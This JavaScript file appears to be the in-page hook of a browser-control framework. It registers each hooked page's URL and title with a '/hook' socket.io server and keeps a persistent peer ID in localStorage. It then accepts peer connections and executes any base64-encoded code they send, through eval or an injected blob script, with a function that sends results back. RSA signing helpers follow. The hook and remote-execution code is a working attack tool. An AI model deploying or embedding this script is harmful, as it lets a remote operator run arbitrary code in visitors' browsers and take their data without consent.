var peer;
var connections = [];
var built_in = ["window","self","document","name","location","customElements","history","navigation","locationbar","menubar","personalbar","scrollbars","statusbar","toolbar","status","closed","frames","length","top","opener","parent","frameElement","navigator","origin","external","screen","innerWidth","innerHeight","scrollX","pageXOffset","scrollY","pageYOffset","visualViewport","screenX","screenY","outerWidth","outerHeight","devicePixelRatio","event","clientInformation","screenLeft","screenTop","styleMedia","onsearch","isSecureContext","trustedTypes","performance","onappinstalled","onbeforeinstallprompt","crypto","indexedDB","sessionStorage","localStorage","onbeforexrselect","onabort","onbeforeinput","onbeforematch","onbeforetoggle","onblur","oncancel","oncanplay","oncanplaythrough","onchange","onclick","onclose","oncontentvisibilityautostatechange","oncontextlost","oncontextmenu","oncontextrestored","oncuechange","ondblclick","ondrag","ondragend","ondragenter","ondragleave","ondragover","ondragstart","ondrop","ondurationchange","onemptied","onended","onerror","onfocus","onformdata","oninput","oninvalid","onkeydown","onkeypress","onkeyup","onload","onloadeddata","onloadedmetadata","onloadstart","onmousedown","onmouseenter","onmouseleave","onmousemove","onmouseout","onmouseover","onmouseup","onmousewheel","onpause","onplay","onplaying","onprogress","onratechange","onreset","onresize","onscroll","onsecuritypolicyviolation","onseeked","onseeking","onselect","onslotchange","onstalled","onsubmit","onsuspend","ontimeupdate","ontoggle","onvolumechange","onwaiting","onwebkitanimationend","onwebkitanimationiteration","onwebkitanimationstart","onwebkittransitionend","onwheel","onauxclick","ongotpointercapture","onlostpointercapture","onpointerdown","onpointermove","onpointerrawupdate","onpointerup","onpointercancel","onpointerover","onpointerout","onpointerenter","onpointerleave","onselectstart","onselectionchange","onanimationend","onanimationiteration","onanimationstart","ontransitionrun","ontransitionstart","ontransitionend","ontransitioncancel","onafterprint","onbeforeprint","onbeforeunload","onhashchange","onlanguagechange","onmessage","onmessageerror","onoffline","ononline","onpagehide","onpageshow","onpopstate","onrejectionhandled","onstorage","onunhandledrejection","onunload","crossOriginIsolated","scheduler","alert","atob","blur","btoa","cancelAnimationFrame","cancelIdleCallback","captureEvents","clearInterval","clearTimeout","close","confirm","createImageBitmap","fetch","find","focus","getComputedStyle","getSelection","matchMedia","moveBy","moveTo","open","postMessage","print","prompt","queueMicrotask","releaseEvents","reportError","requestAnimationFrame","requestIdleCallback","resizeBy","resizeTo","scroll","scrollBy","scrollTo","setInterval","setTimeout","stop","structuredClone","webkitCancelAnimationFrame","webkitRequestAnimationFrame","chrome","fence","launchQueue","originAgentCluster","onpageswap","onpagereveal","credentialless","speechSynthesis","onscrollend","webkitRequestFileSystem","webkitResolveLocalFileSystemURL","caches","cookieStore","ondevicemotion","ondeviceorientation","ondeviceorientationabsolute","sharedStorage","documentPictureInPicture","getScreenDetails","queryLocalFonts","showDirectoryPicker","showOpenFilePicker","showSaveFilePicker",];
if (localStorage.getItem("_peer") !== null) {
    peer = new Peer(localStorage.getItem("_peer"));
} else {
    peer = new Peer(generateRandomString(10));
    localStorage.setItem("_peer", peer.id);
}

const socket = io("/hook");

socket.on('connect', () => {
    console.log("socket connected");
    setTimeout(function() {
        socket.emit("newHook", {
            "peer": peer.id,
            "page": window.location.href,
            "title": document.title
        });
    }, 150);
});

peer.on('open', function(id) {
    console.log('My peer ID is: ' + id);
});

peer.on('connection', (conn) => {
    console.log("Incoming connection from peer:", conn.peer);
    connections.push(conn);

    conn.on('open', () => {
        console.log("Connected to peer:", conn.peer);
    });

    conn.on('data', (data) => {
      if (typeof data == "object") {
        try {
            eval(atob(data.code));
        }catch {
            var _g = new Blob([atob(data.code)]);
            var j = document.createElement("script");
            j.src = URL.createObjectURL(_g);
            document.body.appendChild(j);
        }
      }
    });

    conn.on('error', (err) => {
        console.error('Connection error:', err);
    });
});

function _return(data) {
    for (i in connections) {
        connections[i].send(data);
    }
}

function generateRandomString(length) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}


var newKeyPair = {
    public: "",
    private: ""
  }
  
function genKeyPair() {
    crypt = new JSEncrypt({
      default_key_size: 2048
    });
  var dt = new Date();
  var time = -(dt.getTime());
  crypt.getKey();
  dt = new Date();
  time += (dt.getTime());
  
  newKeyPair.private = crypt.getPrivateKey();
  newKeyPair.public = crypt.getPublicKey();
  console.log(newKeyPair.private,"\n",newKeyPair.public);
  return newKeyPair;
}
  
  
  
          
function doSign(pkey,str) {
    var rsa = new RSAKey();
    rsa.readPrivateKeyFromPEMString(pkey);
    var hashAlg = 'sha256';
    var hSig = rsa.sign(str, hashAlg);
    return linebrk(hSig, 64);
}
  
function doVerify(pubkey,str,verif) {
    //Public key, encoded string, signed string 
    var sMsg = str;
    var hSig = verif;
    hSig = hSig.replace(/[^0-9a-f]+/g, "");
  
    var pubKey = KEYUTIL.getKey(pubkey);
    var isValid = pubKey.verify(sMsg, hSig);
  
    // display verification result
    if (isValid) {
      console.log("Valid");
    } else {
     console.log("invalid");
    }
}